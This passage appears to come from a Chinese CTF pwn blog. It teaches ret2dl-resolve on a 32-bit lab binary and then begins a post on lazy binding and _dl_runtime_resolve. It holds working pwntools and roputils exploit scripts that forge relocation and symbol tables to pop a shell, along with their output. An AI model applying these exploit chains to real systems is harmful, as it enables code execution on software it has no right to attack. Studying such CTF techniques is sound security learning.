keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可利用函数就差不多就只有read，无后门</p><h3 id="gdb-gt-溢出点为44"><a href="#gdb-gt-溢出点为44" class="headerlink" title="gdb==&gt;溢出点为44"></a>gdb==&gt;溢出点为44</h3><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf/test4$ checksec 0pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test4/0pwn'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>hunter@hunter:~/PWN/Freebuf/test4$ </code></pre><h2 id="EXP（栈迁移）"><a href="#EXP（栈迁移）" class="headerlink" title="EXP（栈迁移）"></a>EXP（栈迁移）</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./0pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'0pwn'</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> <span class="token number">0x600</span>alarm_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>rel_plt_addr <span class="token operator">=</span> <span class="token number">0x804833c</span>dynsym_addr <span class="token operator">=</span> <span class="token number">0x80481dc</span>dynstr_addr <span class="token operator">=</span> <span class="token number">0x804827c</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这一部分可以完成栈迁移，rop.migrate(base_stage)迁移至base_stage处</p><h3 id="pwntools-rop模块"><a href="#pwntools-rop模块" class="headerlink" title="pwntools rop模块"></a>pwntools rop模块</h3><blockquote><p>先简单回顾一下ROP的原理，由于NX开启不能在栈上执行shellcode，我们可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些pop/ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上/bin/sh，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发system(‘/bin/sh’)。由于是利用ret指令的exploit，所以叫Return-Oriented Programming。（如果没有开启ASLR，可以直接使用ret2libc技术）<br>好，这样来看，这种技术的难点自然就是如何在栈上布置返回地址以及函数参数了。而ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p></blockquote><p>+call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)<br>+chain() : 返回当前的字节序列，即payload<br>+dump() : 直观地展示出当前的rop chain<br>+raw() : 在rop chain中加上一个整数或字符串<br>+search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget<br>+unresolve(value) : 给出一个地址，反解析出符号<br>+rop.migrate(addr):栈迁移到addr</p><p>设置rop chain对象 此处为0pwn程序。设置完后rop里面是空的（相当于payload）</p><pre class=" language-JavaScript"><code class="language-JavaScript">In [2]: elf = ELF('0pwn')[*] '/home/hunter/PWN/Freebuf/test4/0pwn'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)In [3]: rop = ROP(elf)[*] Loaded cached gadgets for '0pwn'</code></pre><p>rop.raw()</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">60</span><span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>chainOut<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>bound method ROP<span class="token punctuation">.</span>chain of ROP<span class="token punctuation">(</span><span class="token punctuation">[</span>ELF<span class="token punctuation">(</span><span class="token string">'/home/hunter/PWN/Freebuf/test4/0pwn'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span>In <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>In <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">:</span> len<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">60</span>In <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">:</span> </code></pre><p>rop.migrate(addr)</p><pre class=" language-pyton"><code class="language-pyton">rop.raw('A'*44)rop.read(0,base_stage,100)  #调用完read后，用migrate进行栈迁移rop.migrate(base_stage)  </code></pre><h2 id="EXP-伪造）"><a href="#EXP-伪造）" class="headerlink" title="EXP(伪造）"></a>EXP(伪造）</h2><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt0 <span class="token operator">=</span> <span class="token number">0x8048380</span>index_off <span class="token operator">=</span> base_stage <span class="token operator">+</span><span class="token number">28</span> <span class="token operator">-</span> rel_plt_addrfake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span>fake_dynsym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span>fake_dynsym_addr <span class="token operator">+=</span> alignr_off <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_off <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>st_name <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span> <span class="token operator">-</span> dynstr_addrfake_dynsym_tab <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>fake_reloc_tab <span class="token operator">=</span> p32<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_off<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'BBBB'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">82</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_reloc_tab<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span>align<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_dynsym_tab<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'system\x00'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="align"><a href="#align" class="headerlink" title="align"></a>align</h3><p>align的作用是帮fake_dynsym_addr进行对齐，我们仔细说说：</p><p>假设内存布局是这样的  </p><pre class=" language-Assembly"><code class="language-Assembly">如果fake_dynsym_addr直接等于base_stage+36。base_stage+36可以是下面的任何一个位置0x8048a00 11111111 22222222 33333333 44444444   dynsym起始位置0x8048a10 11111111 22222222 33333333 44444444   如果base_stage+36是0x8048a18（33333333）那么就不符合结构体对dynsym的单表16字节大小的设定，所以fake_dynsym_addr0x8048a20 11111111 22222222 33333333 44444444   只能是开头地址0x8048a30 11111111 22222222 33333333 444444440x8048a40 11111111 22222222 33333333 444444440x8048a50 11111111 22222222 33333333 444444440x8048a60 11111111 22222222 33333333 444444440x8048a70 11111111 22222222 33333333 444444440x8048a80 11111111 22222222 33333333 44444444</code></pre><p>得到开头地址的计算方法为：align=0x10 - (fake_dynsym_addr - dynsym_addr)&amp;0xf  ，比如这个例子：fake_dynsym_addr==0x8048a18  ，dynsym_addr==0x8048a00  ==&gt;&gt; align=0x8</p><pre class=" language-Assembly"><code class="language-Assembly">>>> 0x10 - ((0x8048a88 - 0x8048a00) & 0xf) 8</code></pre><p>fake_dynsym_addr += align ==&gt;&gt; 0x8048a18 + 0x8 == 0x8048a20 处于开头位置</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre class=" language-JavaScript"><code class="language-JavaScript">[*] Switching to interactive mode[DEBUG] Received 0x1a bytes:    '/bin/sh: 1: aa: not found\n'/bin/sh: 1: aa: not found$ ls[DEBUG] Sent 0x3 bytes:    'ls\n'[DEBUG] Received 0x7c bytes:    '0pwn\t exp2.py\t\tpeda-session-dash.txt\n'    '0pwn.py  exp.py\t\t\tpeda-session-ls.txt\n'    'core\t peda-session-0pwn.txt\tpeda-session-pwn.txt\n'0pwn     exp2.py        peda-session-dash.txt0pwn.py  exp.py            peda-session-ls.txtcore     peda-session-0pwn.txt    peda-session-pwn.txt[*] Got EOF while reading in interactive$  </code></pre><p>这个aa的出现是因为pwntools自带对齐字符串，补a（具体怎么补我也不是很清楚）</p><p>小结<br>这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，可以直接复制黏贴中间部分拿去打别的题目</p><h2 id="Roputils"><a href="#Roputils" class="headerlink" title="Roputils"></a>Roputils</h2><p>从上面攻击脚本我们不难看出来，虽然构造payload的过程很繁琐，但是实际上大部分代码的格式都是固定的，完全可以自己把它们封装成一个函数进行调用，Roputils工具就是用来干这个的。<br>这个工具功能挺强大的但是，没有文档说明我就学了点针对ret2dl-resolve的代码。<br>详情见：<a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">https://github.com/inaz2/roputils</a></p><p>拿上面那个题为例子：把roputils.py和pwn题放在同一个文件夹下（我不会把它导入python模块）来使用</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP</span><span class="token keyword">from</span> roputils <span class="token keyword">import</span><span class="token operator">*</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'./0pwn'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#ROP继承了ELF类，下面的section, got, plt都是调用父类的</span>bss_addr <span class="token operator">=</span> rop<span class="token punctuation">.</span>section<span class="token punctuation">(</span><span class="token string">'.bss'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#获取bss地址</span>read_got <span class="token operator">=</span> rop<span class="token punctuation">.</span>got<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#获取read_got地址</span>read_plt <span class="token operator">=</span> rop<span class="token punctuation">.</span>plt<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#获取read_plt地址</span>offset <span class="token operator">=</span> <span class="token number">44</span>  <span class="token comment" spellcheck="true">#溢出点</span>sh <span class="token operator">=</span> Proc<span class="token punctuation">(</span><span class="token string">'./0pwn'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#Proc(host='111.11.1.1',port=10000) 相当于remote</span>buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#fill生成pad</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span>read_plt<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#call：利用上面获得的read plt地址再次调用</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_call<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数（system)的参数。</span>                                                    <span class="token comment" spellcheck="true">#这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处</span>sh<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#数据发送</span>buf <span class="token operator">=</span> rop<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#此时buf == '/bin/sh\x00'</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#fill第二个参数被指定，就是将其填充至指定长度</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_data<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">##dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名</span>buf <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充buf</span>sh<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interact<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#设置为0即可</span></code></pre><p>结果:</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf/test4$ python 0pwn_1.pygot a shell<span class="token operator">!</span><span class="token function">ls</span>0pwn0pwn_1.py0pwn.pycoreexp2.pyexp.pypeda-session-0pwn.txtpeda-session-dash.txtpeda-session-ls.txtpeda-session-pwn.txtroputils.pyroputils.pyc</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dlresolve原理理解</title>
      <link href="/2020/08/17/ret2dlresolve/"/>
      <url>/2020/08/17/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h2 id="延迟绑定技术"><a href="#延迟绑定技术" class="headerlink" title="延迟绑定技术"></a>延迟绑定技术</h2><p><strong>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程</strong></p><p>适用于绕过NX和ASLR保护</p><h2 id="探究延迟绑定技术"><a href="#探究延迟绑定技术" class="headerlink" title="探究延迟绑定技术"></a>探究延迟绑定技术</h2><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c">include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token comment" spellcheck="true">// gcc -m32 -fno-stack-protector -no-pie test1.c -o test1</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在开始前对print read函数，查看地址：</p><pre class=" language-bash"><code class="language-bash">Reading symbols from test1<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.gdb-peda$ p <span class="token function">read</span><span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">></span><span class="token punctuation">}</span> 0x80482e0 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>gdb-peda$ </code></pre><p>查看read的plt表的内容：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/3i 0x80482e0   0x80482e0 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>:        jmp    DWORD PTR ds:0x804a00c   0x80482e6 <span class="token operator">&lt;</span>read@plt+6<span class="token operator">></span>:    push   0x0   0x80482eb <span class="token operator">&lt;</span>read@plt+11<span class="token operator">></span>:    jmp    0x80482d0</code></pre><p>可知先会跳到0x804a00c处（read的got表）</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/wx 0x0804a00c0x804a00c:    0x080482e6gdb-peda$ 所以此时read的got表中存储了read@plt的下一条地址0x80482e6 <span class="token operator">&lt;</span>read@plt+6<span class="token operator">></span>:    push   0x0</code></pre><p><strong>因此将会把0压入栈中</strong>，并跳转到0x80482d0地址执行</p><p>0x80482d0为plt表的起始地址，称为plt0，其指令为：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/3i 0x80482d0   0x80482d0:    push   DWORD PTR ds:0x804a004   0x80482d6:    jmp    DWORD PTR ds:0x804a008</code></pre><p>可以看到这两条指令将got+4（0x804a004）里面的值压入栈中，然后跳转到got+8（0x804a008）的地方去执行。跟进got+8：（0x804a004存放linkmap）</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/wx 0x804a0080x804a008:    0xf7fead90gdb-peda$ 这里存的就是大名鼎鼎的_dl_runtime_resolve函数的地址0xf7fead90</code></pre><p>可以看到程序进入到了_dl_runtime_resolve，因此got+8的地方存储的是_dl_runtime_resolve函数的地址。看_dl_runtime_resolve的源码，源码在/sysdeps/i386/dl-trampoline.S中：</p><pre class=" language-bash"><code class="language-bash">0xf7feed90 <span class="token operator">&lt;</span>_dl_runtime_resolve<span class="token operator">></span>       push   eax0xf7feed91 <span class="token operator">&lt;</span>_dl_runtime_resolve+1<span class="token operator">></span>     push   ecx0xf7feed92 <span class="token operator">&lt;</span>_dl_runtime_resolve+2<span class="token operator">></span>     push   edx0xf7feed93 <span class="token operator">&lt;</span>_dl_runtime_resolve+3<span class="token operator">></span>     mov    edx, dword ptr <span class="token punctuation">[</span>esp + 0x10<span class="token punctuation">]</span>0xf7feed97 <span class="token operator">&lt;</span>_dl_runtime_resolve+7<span class="token operator">></span>     mov    eax, dword ptr <span class="token punctuation">[</span>esp + 0xc<span class="token punctuation">]</span>0xf7feed9b <span class="token operator">&lt;</span>_dl_runtime_resolve+11<span class="token operator">></span>    call   _dl_fixup <span class="token operator">&lt;</span>0xf7fe85a0<span class="token operator">></span>注意这个 _dl_fixup 函数的调用</code></pre><blockquote><p>dl_runtime_resolve在源码中是用汇编实现的只是压栈并调用_dl_fixup，在跟进去_dl_fixup前，先给出一些与动态链接相关的数据结构。<br>根据《程序员的自我修养》中的描述：动态链接中最重要的结构应该是dynamic段，这个段里面保存了动态链接器所需要的基本信息。比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<br>我们来查看一下dynamic：</p></blockquote><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -d test1Dynamic section at offset 0xf14 contains 24 entries:  标记        类型                         名称/值 0x00000001 <span class="token punctuation">(</span>NEEDED<span class="token punctuation">)</span>                     共享库：<span class="token punctuation">[</span>libc.so.6<span class="token punctuation">]</span> 0x0000000c <span class="token punctuation">(</span>INIT<span class="token punctuation">)</span>                       0x80482a8 0x0000000d <span class="token punctuation">(</span>FINI<span class="token punctuation">)</span>                       0x80484d4 0x00000019 <span class="token punctuation">(</span>INIT_ARRAY<span class="token punctuation">)</span>                 0x8049f0c 0x0000001b <span class="token punctuation">(</span>INIT_ARRAYSZ<span class="token punctuation">)</span>               4 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x0000001a <span class="token punctuation">(</span>FINI_ARRAY<span class="token punctuation">)</span>                 0x8049f10 0x0000001c <span class="token punctuation">(</span>FINI_ARRAYSZ<span class="token punctuation">)</span>               4 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x6ffffef5 <span class="token punctuation">(</span>GNU_HASH<span class="token punctuation">)</span>                   0x80481ac 0x00000005 <span class="token punctuation">(</span>STRTAB<span class="token punctuation">)</span>    动态链接符号表    0x804821c 0x00000006 <span class="token punctuation">(</span>SYMTAB<span class="token punctuation">)</span>    动态链接字符串    0x80481cc 0x0000000a <span class="token punctuation">(</span>STRSZ<span class="token punctuation">)</span>                      74 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x0000000b <span class="token punctuation">(</span>SYMENT<span class="token punctuation">)</span>      单个符号表大小  16 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x00000015 <span class="token punctuation">(</span>DEBUG<span class="token punctuation">)</span>                      0x0 0x00000003 <span class="token punctuation">(</span>PLTGOT<span class="token punctuation">)</span>                     0x804a000 0x00000002 <span class="token punctuation">(</span>PLTRELSZ<span class="token punctuation">)</span>                   16 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x00000014 <span class="token punctuation">(</span>PLTREL<span class="token punctuation">)</span>                     REL 0x00000017 <span class="token punctuation">(</span>JMPREL<span class="token punctuation">)</span>      函数重定位表    0x8048298 0x00000011 <span class="token punctuation">(</span>REL<span class="token punctuation">)</span>                        0x8048290 0x00000012 <span class="token punctuation">(</span>RELSZ<span class="token punctuation">)</span>                      8 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x00000013 <span class="token punctuation">(</span>RELENT<span class="token punctuation">)</span>    单个重定位表大小  8 <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> 0x6ffffffe <span class="token punctuation">(</span>VERNEED<span class="token punctuation">)</span>                    0x8048270 0x6fffffff <span class="token punctuation">(</span>VERNEEDNUM<span class="token punctuation">)</span>                 1 0x6ffffff0 <span class="token punctuation">(</span>VERSYM<span class="token punctuation">)</span>                     0x8048266 0x00000000 <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span>                       0x0</code></pre><p>他们其实是一个结构体数组，其结构体定义为：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Elf32_Sword     d_tag<span class="token punctuation">;</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        Elf32_Word  d_val<span class="token punctuation">;</span>        Elf32_Addr  d_ptr<span class="token punctuation">;</span>    <span class="token punctuation">}</span> d_un<span class="token punctuation">;</span><span class="token punctuation">}</span> Elf32_Dyn<span class="token punctuation">;</span><span class="token keyword">extern</span> Elf32_Dyn_DYNAMIC<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>Elf32_Dyn结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。下面给出和延迟绑定相关的类型值的定义。</p><ul><li><p>d_tag类型                     d_un的定义</p></li><li><p>#define DT_STRTAB 5            动态链接字符串表的地址，d_ptr表示.dynstr的地址 (Address of string table)</p></li><li><p>#define DT_SYMTAB 6         动态链接符号表的地址，d_ptr表示.dynsym的地址 (Address of symbol table)</p></li><li><p>#define DT_JMPREL 23         动态链接重定位表的地址,d_ptr表示.rel.plt的地址 (Address of PLT relocs)</p></li><li><p>#define DT_RELENT 19         单个重定位表项的大小，d_val表示单个重定位表项大小 (Size of one Rel reloc )</p></li><li><p>#define DT_SYMENT 11         单个符号表项的大小，d_val表示单个符号表项大小 (Size of one symbol table entry )<br>如上图所示，可以看到字符串表.dynstr的地址为0x804822c，符号表.dynsym地址为0x80481cc，其单个符号表项的大小为16，重定位表.rel.plt的地址为 0x80482d8，其单个重定位表项的大小为8<br>.rel.plt重定位表中包含了需要重定位的函数的信息，其也是一个结构体数组，结构体Elf32_Rel定义如下，其中r_offset表示got表地址，即动态解析函数后真正的函数地址需要填入的地方，r_info由两部分构成，r_info&gt;&gt;8表示该函数对应在符号表.dynsym中的下标，r_info&amp;0xff则表示重定位类型。：<br>（&gt;&gt;或&lt;&lt;就是将其二进制数据右移或左移，用0补齐）</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>  Elf32_Addr        r_offset<span class="token punctuation">;</span>对于可执行文件，此值为虚拟地址  Elf32_Word       r_info<span class="token punctuation">;</span>用于符号表索引<span class="token punctuation">}</span> Elf32_Rel<span class="token punctuation">;</span></code></pre></li></ul><p>查看一下重定位表0x8048298：</p><pre class=" language-bash"><code 